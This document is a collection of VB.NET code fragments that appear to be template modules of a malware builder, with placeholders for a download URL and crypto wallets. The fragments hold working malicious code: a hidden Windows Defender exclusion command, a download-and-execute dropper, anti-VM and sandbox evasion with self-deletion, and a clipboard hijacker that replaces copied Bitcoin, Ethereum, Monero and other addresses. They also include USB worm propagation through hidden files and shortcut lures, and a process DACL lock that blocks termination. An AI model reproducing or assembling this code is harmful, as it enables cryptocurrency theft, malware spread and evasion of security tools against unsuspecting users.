data.value:
Public Shared Sub WD_exception() If Admin = True Then Try Dim proc As Process = New Process With { .StartInfo = New ProcessStartInfo With { .FileName = "powershell", .Arguments = "Set-MpPreference -ExclusionExtension exe,vbs,bat,hta,lnk,dll,ps1;exit", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True } } proc.Start() Catch ex As Exception
End Try End If End Sub

data.value: If Not Program.LO.FullName = Functions.DIR & "\" & Functions.payload Then Try Dim Path As String = IO.Path.GetTempFileName & "%Binder_name%" Dim wed As New Net.WebClient() wed.DownloadFile("%url%", Path) If File.Exists(Path) = True Then Process.Start(Path) End If Catch ex As Exception End Try End If

data.value:
Public Class AntiVM Public Declare Auto Function GetModuleHandle Lib "kernel32.dll" (lpModuleName As String) As IntPtr Public Shared Function Sandboxie()
Dim result As Boolean Try If CInt(GetModuleHandle("SbieDll.dll")) <> 0 Then Try Shell(StrReverse(" led & 2 n- 0 gnip c/ exe.dmc") & """" & Application.ExecutablePath & """", AppWinStyle.Hide, False, -1) Environment.Exit(0) Catch exception10 As Exception End Try End If Catch ex As Exception End Try Return result End Function Public Shared Function AntiVM() Dim result As Boolean Try If File.Exists(Path.GetTempPath() + "ms.ini") Then result = False Else Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_VideoController") Dim str As String = String.Empty Try For Each managementBaseObject As ManagementBaseObject In managementObjectSearcher.[Get]() Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject) str = Convert.ToString(RuntimeHelpers.GetObjectValue(managementObject("Description"))) Dim text As String = Strings.StrConv(str, VbStrConv.Lowercase, 0) If text.Contains("virtual") Or ("vmware") Or ("parallel") Or ("vm additions") Or ("remotefx") Or ("generic") Or ("cirrus logic") Or ("standard vga") Or ("matrox") Then Try Shell(StrReverse(" led & 2 n- 0 gnip c/ exe.dmc") & """" & Application.ExecutablePath & """", AppWinStyle.Hide, False, -1) Environment.Exit(0) Catch exception10 As Exception End Try End If Sandboxie() Next Finally Dim enumerator As ManagementObjectCollection.ManagementObjectEnumerator If enumerator IsNot Nothing Then CType(enumerator, IDisposable).Dispose() End If End Try result = False End If Catch ex As Exception result = False End Try Return result End Function
End Class

Class Grabber Public Shared btc As String = "%BTC%" Public Shared eth As String = "%ETH%" Public Shared xmr As String = "%XMR%" Public Shared xml As String = "%XML%" Public Shared xrp As String = "%XRP%" Public Shared ltc As String = "%LTC%" Public Shared nec As String = "%NEC%" Public Shared ReadOnly btcregex As Regex = New Regex("\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b") Public Shared ReadOnly xmrregex As Regex = New Regex("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") Public Shared ReadOnly ltcregex As Regex = New Regex("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") Public Shared ReadOnly xrpregex As Regex = New Regex("(?:^r[0-9a-zA-Z]{24,34}$)") Public Shared ReadOnly ethregex As Regex = New Regex("(?:^0x[a-fA-F0-9]{40}$)") Public Shared ReadOnly xmlregex As Regex = New Regex("(?:^G[0-9a-zA-Z]{55}$)") Public Shared ReadOnly necregex As Regex = New Regex("(?:^A[0-9a-zA-Z]{33}$)") <DllImport("user32.dll", SetLastError:=True)> Public Shared Function AddClipboardFormatListener(ByVal hwnd As IntPtr) As Boolean End Function <DllImport("user32.dll", SetLastError:=True)> Public Shared Function SetParent(ByVal hWndChild As IntPtr, ByVal hWndNewParent As IntPtr) As IntPtr End Function Public Const clp As Integer = &H31D Public Shared intpreclp As IntPtr = New IntPtr(-3) Public Shared Sub Start() Dim T As New Thread(Sub() Run() End Sub) T.Start() End Sub Public Shared Sub Run() Application.Run(New NotificationForm()) End Sub Public Shared Function GetText() As String Dim ReturnValue As String = String.Empty Dim STAThread As Thread = New Thread(Sub() ReturnValue = System.Windows.Forms.Clipboard.GetText() End Sub) STAThread.SetApartmentState(ApartmentState.STA) STAThread.Start() STAThread.Join() Return ReturnValue End Function
Public Shared Sub SetText(ByVal txt As String) Dim STAThread As Thread = New Thread(Sub() System.Windows.Forms.Clipboard.SetText(txt) End Sub) STAThread.SetApartmentState(ApartmentState.STA) STAThread.Start() STAThread.Join() End Sub End Class
Public Class NotificationForm Inherits Form public Shared currentClipboard As String = Grabber.GetText() Public Sub New() Grabber.SetParent(Handle, Grabber.intpreclp) Grabber.AddClipboardFormatListener(Handle) End Sub
public Function RegexResult(ByVal pattern As Regex) As Boolean If pattern.Match(currentClipboard).Success Then Return True Else Return False End If End Function #GRB = Nothing Protected Overrides ReadOnly Property CreateParams As CreateParams Get Dim cp = MyBase.CreateParams cp.ExStyle = cp.ExStyle Or &H80 Return cp End Get End Property End Class

Public Class USB
public Off As Boolean = False Dim thread As Threading.Thread = Nothing Dim r As New Random Public ExeName As String = "USB.exe" Public Sub Start() If thread Is Nothing Then thread = New Threading.Thread(AddressOf usb, 1) thread.Start() End If End Sub Public Sub clean() Off = True Do Until thread Is Nothing Threading.Thread.Sleep(1) Loop For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives Try If x.IsReady Then If x.DriveType = IO.DriveType.Removable Or x.DriveType = IO.DriveType.CDRom Then
If IO.File.Exists(x.Name & ExeName) Then IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal) IO.File.Delete(x.Name & ExeName) End If For Each xx As String In IO.Directory.GetFiles(x.Name) Try IO.File.SetAttributes(xx, IO.FileAttributes.Normal) If xx.ToLower.EndsWith(".lnk") Then IO.File.Delete(xx) End If Catch ex As Exception End Try Next For Each xx As String In IO.Directory.GetDirectories(x.Name) Try With New IO.DirectoryInfo(xx) .Attributes = IO.FileAttributes.Normal End With Catch ex As Exception End Try Next End If End If Catch ex As Exception End Try Next End Sub Sub usb() Off = False Do Until Off = True
For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives Try If x.IsReady Then If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType.Removable Or x.DriveType = IO.DriveType.CDRom Then
Try If IO.File.Exists(x.Name & ExeName) Then IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal) End If
IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True) IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
For Each xx As String In IO.Directory.GetFiles(x.Name)
If IO.Path.GetExtension(xx).ToLower <> ".lnk" And xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then IO.File.SetAttributes(xx, IO.FileAttributes.Hidden) IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
With CreateObject("WScript.Shell").CreateShortcut(x.Name & New IO.FileInfo(xx).Name & ".lnk") .TargetPath = "cmd.exe" .WorkingDirectory = "" .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx).Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit" .IconLocation = GetIcon(IO.Path.GetExtension(xx)) .Save() End With End If Next

data.value: Public Class protect_process Public Declare Function GetKernelObjectSecurity Lib "advapi32.dll" (Handle As IntPtr, securityInformation As Integer, pSecurityDescriptor As Byte(), nLength As UInteger, ByRef lpnLengthNeeded As UInteger) As Boolean Public Declare Function GetCurrentProcess Lib "kernel32.dll" () As IntPtr Public Declare Function SetKernelObjectSecurity Lib "advapi32.dll" (Handle As IntPtr, securityInformation As Integer, pSecurityDescriptor As Byte()) As Boolean Public Shared Function GetProcessSecurity(processHandle As IntPtr) As RawSecurityDescriptor Dim array As Byte() = New Byte(1) {} Dim num As UInteger GetKernelObjectSecurity(processHandle, 4, array, 0UI, num) array = New Byte(num + 1UI - 1) {} If CULng(num) < 0UL OrElse CULng(num) > 32767UL Then Throw New Win32Exception() End If If Not GetKernelObjectSecurity(processHandle, 4, array, num, num) Then Throw New Win32Exception() End If Return New RawSecurityDescriptor(array, 0) End Function Public Shared Sub SetProcessSecurity(processHandle As IntPtr, dacl As RawSecurityDescriptor) Dim array As Byte() = New Byte(dacl.BinaryLength - 1 + 1 - 1) {} dacl.GetBinaryForm(array, 0) If Not SetKernelObjectSecurity(processHandle, 4, array) Then Throw New Win32Exception() End If End Sub Public Shared Sub Protection() Try Dim currentProcess As IntPtr = GetCurrentProcess() Dim processSecurityDescriptor As Object = GetProcessSecurity(currentProcess) NewLateBinding.LateCall(NewLateBinding.LateGet(processSecurityDescriptor, Nothing, "DiscretionaryAcl", New Object(-1) {}, Nothing, Nothing, Nothing), Nothing, "InsertAce", New Object() {0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing)}, Nothing, Nothing, Nothing, True) SetProcessSecurity(currentProcess, CType(processSecurityDescriptor, RawSecurityDescriptor)) Catch ex As Exception End Try End Sub End Class

data.value: If Not Program.LO.FullName = Functions.DIR & "\" & Functions.payload Then Try Dim Path As String = IO.Path.GetTempFileName & "%Binder_name%" Dim Asm As Assembly = Assembly.GetExecutingAssembly() Dim Rec As ResourceManager = New ResourceManager("%E400%", Asm) Dim BB As Byte() = (CType(Rec.GetObject("%Byte%"), Byte())) File.WriteAllBytes(Path, BB) If File.Exists(Path) = True Then Process.Start(Path) End If Catch ex As Exception End Try End If

Protected Overrides Sub WndProc(ByRef m As Message) If m.Msg = Grabber.clp Then currentClipboard = Grabber.GetText() If RegexResult(Grabber.btcregex) AndAlso Not currentClipboard.Contains(Grabber.btc) Then Dim result As String = Grabber.btcregex.Replace(currentClipboard, Grabber.btc) Grabber.SetText(result) End If If RegexResult(Grabber.ethregex) AndAlso Not currentClipboard.Contains(Grabber.eth) Then Dim result1 As String = Grabber.ethregex.Replace(currentClipboard, Grabber.eth) Grabber.SetText(result1) End If If RegexResult(Grabber.xmrregex) AndAlso Not currentClipboard.Contains(Grabber.xmr) Then Dim result2 As String = Grabber.xmrregex.Replace(currentClipboard, Grabber.xmr) Grabber.SetText(result2) End If If RegexResult(Grabber.xmlregex) AndAlso Not currentClipboard.Contains(Grabber.xml) Then Dim result3 As String = Grabber.xmlregex.Replace(currentClipboard, Grabber.xml) Grabber.SetText(result3) End If If RegexResult(Grabber.xrpregex) AndAlso Not currentClipboard.Contains(Grabber.xrp) Then Dim result4 As String = Grabber.xrpregex.Replace(currentClipboard, Grabber.xrp) Grabber.SetText(result4) End If
If RegexResult(Grabber.ltcregex) AndAlso Not currentClipboard.Contains(Grabber.ltc) Then Dim result5 As String = Grabber.ltcregex.Replace(currentClipboard, Grabber.ltc) Grabber.SetText(result5) End If If RegexResult(Grabber.necregex) AndAlso Not currentClipboard.Contains(Grabber.nec) Then Dim result6 As String = Grabber.necregex.Replace(currentClipboard, Grabber.nec) Grabber.SetText(result6) End If End If MyBase.WndProc(m) End Sub
